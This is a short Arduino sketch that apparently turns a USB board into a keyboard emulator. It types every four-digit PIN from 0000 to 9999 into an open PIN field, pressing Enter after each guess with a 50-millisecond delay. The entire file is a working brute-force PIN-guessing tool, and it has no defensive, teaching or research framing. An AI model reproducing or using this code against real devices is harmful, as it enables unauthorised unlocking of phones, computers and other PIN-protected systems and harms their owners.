#include "Keyboard.h"

// Delay between each key press for reliability
const int delayBetween = 50;  // Adjust if necessary

void setup() {
  // Begin Keyboard communication
  Keyboard.begin();
  delay(1000); // Give time to open a PIN input field
}

void loop() {
  // Loop through all possible 4-digit PIN combinations (0000 to 9999)
  for (int i = 0; i <= 9999; i++) {
    String pin = formatPin(i);  // Format PIN to always be 4 digits
    typePin(pin);               // Type the PIN
    Keyboard.write(KEY_RETURN); // Press Enter or Return
    delay(delayBetween);        // Short delay between attempts
  }
  // Once done, stop the program
  while (1);
}

// Helper function to type each PIN digit
void typePin(String pin) {
  for (int i = 0; i < pin.length(); i++) {
    Keyboard.print(pin[i]);
  }
}

// Helper function to format PIN to always be 4 digits
String formatPin(int pinNumber) {
  String pin = String(pinNumber);
  while (pin.length() < 4) {
    pin = "0" + pin;  // Add leading zeros if necessary
  }
  return pin;
}
